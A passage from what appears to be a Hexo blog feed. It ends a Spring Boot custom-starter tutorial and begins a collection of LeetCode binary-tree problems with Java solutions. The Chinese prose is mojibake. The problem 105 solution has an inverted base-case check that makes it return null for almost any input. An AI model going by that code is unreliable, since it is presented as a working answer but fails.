class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line"></span><br><span class="line">    HelloProperties helloProperties;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> HelloProperties <span class="title function_">getHelloProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> helloProperties;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHelloProperties</span><span class="params">(HelloProperties helloProperties)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.helloProperties = helloProperties;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHellAtguigu</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> helloProperties.getPrefix()+<span class="string">&quot;-&quot;</span> +name + helloProperties.getSuffix();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.condition.ConditionalOnWebApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.EnableConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span> <span class="comment">//webåº”ç”¨æ‰ç”Ÿæ•ˆ</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties(HelloProperties.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceAutoConfiguration</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    HelloProperties helloProperties;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> HelloService <span class="title function_">helloService</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">HelloService</span> <span class="variable">service</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloService</span>();</span><br><span class="line">        service.setHelloProperties(helloProperties);</span><br><span class="line">        <span class="keyword">return</span> service;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="æ›´å¤šspringbootæ•´åˆç¤ºä¾‹">æ›´å¤šSpringBootæ•´åˆç¤ºä¾‹</span></h1><p><a href="https://github.com/spring-projects/spring-boot/tree/master/spring-boot-samples">https://github.com/spring-projects/spring-boot/tree/master/spring-boot-samples</a></p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ‘</title>
      <link href="/2020/03/30/Tree/"/>
      <url>/2020/03/30/Tree/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ‘˜å½•äº†ä¸€äº›ç»å…¸çš„æ ‘çš„é¢˜ï¼Œä¸€å…±é¢˜ã€‚</p><span id="more"></span><!-- toc --><ul><li><a href="#%E6%A0%91%E7%9A%84%E9%87%8D%E5%BB%BA">æ ‘çš„é‡å»º</a><ul><li><a href="#105-construct-binary-tree-from-preorder-and-inorder-traversal-">105. Construct Binary Tree from Preorder and Inorder Traversal -</a></li><li><a href="#106-construct-binary-tree-from-inorder-and-postorder-traversal-">106. Construct Binary Tree from Inorder and Postorder Traversal -</a></li><li><a href="#297-serialize-and-deserialize-binary-tree-">297. Serialize and Deserialize Binary Tree -</a></li><li><a href="#109-convert-sorted-list-to-binary-search-tree-">109. Convert Sorted List to Binary Search Tree -</a></li><li><a href="#99-recover-binary-search-tree">99. Recover Binary Search Tree Ã—</a></li></ul></li><li><a href="#%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86%E5%9B%9E%E6%BA%AF">æ ‘çš„éå†ï¼ˆå›æº¯ï¼‰</a><ul><li><a href="#94-binary-tree-inorder-traversal-iteratively">94. Binary Tree Inorder Traversal (Iteratively) Ã—</a></li><li><a href="#144-binary-tree-preorder-traversal-iteratively">144. Binary Tree Preorder Traversal (Iteratively) Ã—</a></li><li><a href="#145-binary-tree-postorder-traversal-iteratively">145. Binary Tree Postorder Traversal (Iteratively) Ã—</a></li><li><a href="#103-binary-tree-zigzag-level-order-traversal">103. Binary Tree Zigzag Level Order Traversal âˆš</a></li><li><a href="#102-binary-tree-level-order-traversal">102. Binary Tree Level Order Traversal âˆš</a></li><li><a href="#107-binary-tree-level-order-traversal-ii">107. Binary Tree Level Order Traversal II âˆš</a></li><li><a href="#637-average-of-levels-in-binary-tree">637. Average of Levels in Binary Tree âˆš</a></li><li><a href="#515-find-largest-value-in-each-tree-row">515. Find Largest Value in Each Tree Row âˆš</a></li><li><a href="#513-find-bottom-left-tree-value">513. Find Bottom Left Tree Value âˆš</a></li><li><a href="#1302-deepest-leaves-sum">1302. Deepest Leaves Sum âˆš</a></li><li><a href="#226-invert-binary-tree">226. Invert Binary Tree âˆš</a></li><li><a href="#112-path-sum">112. Path Sum âˆš</a></li><li><a href="#111-minimum-depth-of-binary-tree">111. Minimum Depth of Binary Tree âˆš</a></li><li><a href="#437-path-sum-iii-">437. Path Sum III -</a></li><li><a href="#404-sum-of-left-leaves">404. Sum of Left Leaves Ã—</a></li><li><a href="#687-longest-univalue-path">687. Longest Univalue Path Ã—</a></li><li><a href="#337-house-robber-iii">337. House Robber III âˆš</a></li><li><a href="#590-n-ary-tree-postorder-traversal">590. N-ary Tree Postorder Traversal âˆš</a></li><li><a href="#589-n-ary-tree-preorder-traversal">589. N-ary Tree Preorder Traversal âˆš</a></li><li><a href="#559-maximum-depth-of-n-ary-tree">559. Maximum Depth of N-ary Tree âˆš</a></li><li><a href="#337-house-robber-iii-">337. House Robber III -</a></li></ul></li><li><a href="#%E6%A0%91%E7%9A%84%E6%80%A7%E8%B4%A8">æ ‘çš„æ€§è´¨</a><ul><li><a href="#897-increasing-order-search-tree">897. Increasing Order Search Tree Ã—</a></li><li><a href="#671-second-minimum-node-in-a-binary-tree">671. Second Minimum Node In a Binary Tree Ã—</a></li><li><a href="#98-validate-binary-search-tree-">98. Validate Binary Search Tree -</a></li><li><a href="#110-balanced-binary-tree">110. Balanced Binary Tree âˆš</a></li></ul></li><li><a href="#%E4%B8%A4%E6%A3%B5%E6%A0%91%E7%9A%84%E5%88%A4%E6%96%AD">ä¸¤æ£µæ ‘çš„åˆ¤æ–­</a><ul><li><a href="#101-symmetric-tree">101. Symmetric Tree âˆš</a></li><li><a href="#100-same-tree">100. Same Tree âˆš</a></li><li><a href="#617-merge-two-binary-trees">617. Merge Two Binary Trees âˆš</a></li><li><a href="#572-subtree-of-another-tree">572. Subtree of Another Tree âˆš</a></li></ul></li></ul><!-- tocstop --><h1><span id="æ ‘çš„é‡å»º">æ ‘çš„é‡å»º</span></h1><h2><span id="105-construct-binary-tree-from-preorder-and-inorder-traversal-">105. Construct Binary Tree from Preorder and Inorder Traversal -</span></h2><p>Given preorder and inorder traversal of a tree, construct the binary tree.</p><p><strong>Note:</strong><br>You may assume that duplicates do not exist in the tree.</p><p>For example, given</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preorder = [3,9,20,15,7]</span><br><span class="line">inorder = [9,3,15,20,7]</span><br></pre></td></tr></table></figure><p>Return the following binary tree:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> build(preorder,<span class="number">0</span>,preorder.length-<span class="number">1</span>,inorder,<span class="number">0</span>,inorder.length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> TreeNode <span class="title function_">build</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span> preS, <span class="type">int</span> preE, <span class="type">int</span>[] inorder, <span class="type">int</span> inS, <span class="type">int</span> inE)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(preE&gt;preS||inE&gt;inS) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    TreeNode root=<span class="keyword">new</span> <span class="title class_">TreeNode</span>(preorder[preS]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> inS; i &lt;=inE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(inorder[i]==preorder[preS])&#123;</span><br><span class="line">            root.left=build(preorder,preS+<span class="number">1</span>,preS+i-inS,inorder,inS,i-<span class="number">1</span>);</span><br><span class="line">            root.right=build(preorder,preS+i-inS+<span class="number">1</span>,preE,inorder,i+<span class="number">1</span>,inE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹inorderæ¥è¯´iå°±æ˜¯æ‰¾åˆ°çš„ä½ç½®ï¼Œä½†æ˜¯å¯¹postæˆ–è€…preæ¥è¯´å¿…é¡»å’Œi-inSæœ‰å…³</p><h2><span id="106-construct-binary-tree-from-inorder-and-postorder-traversal-">106. Construct Binary Tree from Inorder and Postorder Traversal -</span></h2><p>Given inorder and postorder traversal of a tree, construct the binary tree.</p><p><strong>Note:</strong><br>You may assume that duplicates do not exist in the tree.</p><p>For example, given</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inorder = [9,3,15,20,7]</span><br><span class="line">postorder = [9,15,7,20,3]</span><br></pre></td></tr></table></figure><p>Return the following binary tree:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> build(inorder,<span class="number">0</span>,inorder.length-<span class="number">1</span>,postorder,<span class="number">0</span>,postorder.length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> TreeNode <span class="title function_">build</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span> inS, <span class="type">int</span> inE, <span class="type">int</span>[] postorder, <span class="type">int</span> poS, <span class="type">int</span> poE)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(inS&gt;inE||poS&gt;poE) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(postorder[poE]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> inS; i &lt;=inE ; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(inorder[i]==postorder[poE])&#123;</span><br><span class="line">            root.left=build(inorder,inS,i-<span class="number">1</span>,postorder, poS, poS+i-inS-<span class="number">1</span>);</span><br><span class="line">            root.right=build(inorder,i+<span class="number">1</span>,inE,postorder,poS+i-inS,poE-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="297-serialize-and-deserialize-binary-tree-">297. Serialize and Deserialize Binary Tree -</span></h2><p>Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment.</p><p>Design an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization&#x2F;deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure.</p><p><strong>Example:</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">You may serialize the following tree:</span><br><span class="line"></span><br><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line">     / \</span><br><span class="line">    4   5</span><br><span class="line"></span><br><span class="line">as &quot;[1,2,3,null,null,4,5]&quot;</span><br></pre></td></tr></table></figure><ul><li><p>é€’å½’ç‰ˆæœ¬ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">serialize</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">       buildString(root, sb);</span><br><span class="line">       <span class="keyword">return</span> sb.toString();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">buildString</span><span class="params">(TreeNode node, StringBuilder sb)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">           sb.append(<span class="string">&quot;#,&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           sb.append(node.val+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">           buildString(node.left, sb);</span><br><span class="line">           buildString(node.right,sb);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// Decodes your encoded data to tree.</span></span><br><span class="line">   <span class="keyword">public</span> TreeNode <span class="title function_">deserialize</span><span class="params">(String data)</span> &#123;</span><br><span class="line">       Deque&lt;String&gt; nodes = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">       nodes.addAll(Arrays.asList(data.split(<span class="string">&quot;,&quot;</span>)));</span><br><span class="line">       <span class="keyword">return</span> buildTree(nodes);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> TreeNode <span class="title function_">buildTree</span><span class="params">(Deque&lt;String&gt; nodes)</span> &#123;</span><br><span class="line">       <span class="type">String</span> <span class="variable">val</span> <span class="operator">=</span> nodes.remove();</span><br><span class="line">       <span class="keyword">if</span> (val.equals(<span class="string">&quot;#&quot;</span>)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(Integer.valueOf(val));</span><br><span class="line">           node.left = buildTree(nodes);</span><br><span class="line">           node.right = buildTree(nodes);</span><br><span class="line">           <span class="keyword">return</span> node;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p>è¿­ä»£ç‰ˆæœ¬ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">serialize</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">       <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">       Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">       q.offer(root);</span><br><span class="line">       <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">          <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> q.poll();</span><br><span class="line">               <span class="keyword">if</span>(tmp==<span class="literal">null</span>)&#123;</span><br><span class="line">                   sb.append(<span class="string">&quot;#,&quot;</span>);</span><br><span class="line">                   <span class="keyword">continue</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               sb.append(tmp.val+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">               q.offer(tmp.left);</span><br><span class="line">               q.offer(tmp.right); </span><br><span class="line">               </span><br><span class="line">           </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> sb.toString();</span><br><span class="line">   &#125;</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// Decodes your encoded data to tree.</span></span><br><span class="line">   <span class="keyword">public</span> TreeNode <span class="title function_">deserialize</span><span class="params">(String data)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(data.length()==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       String str[]=data.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">       TreeNode root=<span class="keyword">new</span> <span class="title class_">TreeNode</span>(Integer.valueOf(str[<span class="number">0</span>]));</span><br><span class="line">       Queue&lt;TreeNode&gt; q= <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">       q.offer(root);</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;str.length;i++)&#123;</span><br><span class="line">           <span class="type">TreeNode</span> <span class="variable">parent</span> <span class="operator">=</span> q.poll();</span><br><span class="line">           <span class="keyword">if</span>(!str[i].equals(<span class="string">&quot;#&quot;</span>))&#123;</span><br><span class="line">               TreeNode left=<span class="keyword">new</span> <span class="title class_">TreeNode</span>(Integer.valueOf(str[i]));</span><br><span class="line">               parent.left=left;</span><br><span class="line">               q.offer(left);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span>(!str[++i].equals(<span class="string">&quot;#&quot;</span>))&#123;</span><br><span class="line">               TreeNode right=<span class="keyword">new</span> <span class="title class_">TreeNode</span>(Integer.valueOf(str[i]));</span><br><span class="line">               parent.right=right;</span><br><span class="line">               q.offer(right);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> root;</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li></ul><h2><span id="109-convert-sorted-list-to-binary-search-tree-">109. Convert Sorted List to Binary Search Tree -</span></h2><p>  Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST.</p><p>  For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of <em>every</em> node never differ by more than 1.</p><p>  <strong>Example:</strong></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Given the sorted linked list: [-10,-3,0,5,9],</span><br><span class="line"></span><br><span class="line">One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST:</span><br><span class="line"></span><br><span class="line">      0</span><br><span class="line">     / \</span><br><span class="line">   -3   9</span><br><span class="line">   /   /</span><br><span class="line"> -10  5</span><br></pre></td></tr></table></figure><ul><li>æš´åŠ›æ³•ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">sortedListToBST</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> find(head);</span><br><span class="line">       <span class="keyword">return</span> build(head,<span class="number">0</span>,len-<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> TreeNode <span class="title function_">build</span><span class="params">(ListNode head,<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(hi&lt;lo) <span class="keyword">return</span> <span class="literal">null</span>;        </span><br><span class="line">       <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> lo + (hi-lo)/<span class="number">2</span>;</span><br><span class="line">       <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(getVal(head,mid));</span><br><span class="line">       root.left=build(head,lo,mid-<span class="number">1</span>);</span><br><span class="line">       root.right=build(head,mid+<span class="number">1</span>,hi);</span><br><span class="line">       <span class="keyword">return</span> root;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">(ListNode head, <span class="type">int</span> index)</span>&#123;</span><br><span class="line">       <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">while</span>(i&lt;index)&#123;</span><br><span class="line">           head=head.next;</span><br><span class="line">           i++;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> head.val;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(ListNode head)</span>&#123;</span><br><span class="line">       <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">while</span>(head!=<span class="literal">null</span>)&#123;</span><br><span class="line">           i+=<span class="number">1</span>;</span><br><span class="line">           head=head.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> i;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>æ­£è§£</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">sortedListToBST</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> toBST(head,<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">toBST</span><span class="params">(ListNode head, ListNode tail)</span>&#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="keyword">if</span>(head==tail) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(fast!=tail&amp;&amp;fast.next!=tail)&#123;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">thead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(slow.val);</span><br><span class="line">    thead.left = toBST(head,slow);</span><br><span class="line">    thead.right = toBST(slow.next,tail);</span><br><span class="line">    <span class="keyword">return</span> thead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="99-recover-binary-search-tree">99. Recover Binary Search Tree Ã—</span></h2><p>Two elements of a binary search tree (BST) are swapped by mistake.</p><p>Recover the tree without changing its structure.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,null,null,2]</span><br><span class="line"></span><br><span class="line">   1</span><br><span class="line">  /</span><br><span class="line"> 3</span><br><span class="line">  \</span><br><span class="line">   2</span><br><span class="line"></span><br><span class="line">Output: [3,1,null,null,2]</span><br><span class="line"></span><br><span class="line">   3</span><br><span 